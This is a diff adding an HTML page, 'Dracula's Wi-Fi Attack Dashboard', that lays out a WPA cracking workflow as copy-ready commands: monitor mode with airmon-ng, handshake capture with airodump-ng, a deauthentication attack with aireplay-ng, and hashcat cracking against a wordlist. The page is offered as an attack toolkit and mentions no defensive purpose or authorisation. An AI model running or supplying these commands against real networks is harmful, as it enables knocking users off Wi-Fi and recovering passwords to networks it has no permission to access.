@@ -1,0 +1,21 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Dracula Wi-Fi Attack Lab</title>
+  <style>
+    body { background: #111; color: #eee; font-family: Arial; padding: 20px; }
+    h1 { color: #e91e63; }
+    pre { background: #000; color: #0f0; padding: 10px; }
+  </style>
+</head>
+<body>
+  <h1>🧛 Dracula's Wi-Fi Attack Dashboard</h1>
+  <p>Use these commands in Git Bash or WSL (Windows Subsystem for Linux)</p>
+  <div><h2>Start Monitor Mode</h2><pre>airmon-ng start wlan0</pre></div>
+  <div><h2>Capture WPA Handshake</h2><pre>airodump-ng wlan0mon --bssid [AP_MAC] -c [CH] -w handshake</pre></div>
+  <div><h2>Deauth Attack</h2><pre>aireplay-ng -0 10 -a [AP_MAC] wlan0mon</pre></div>
+  <div><h2>Crack with Hashcat</h2><pre>hashcat -m 22000 handshake.hc22000 rockyou.txt</pre></div>
+</body>
+</html>
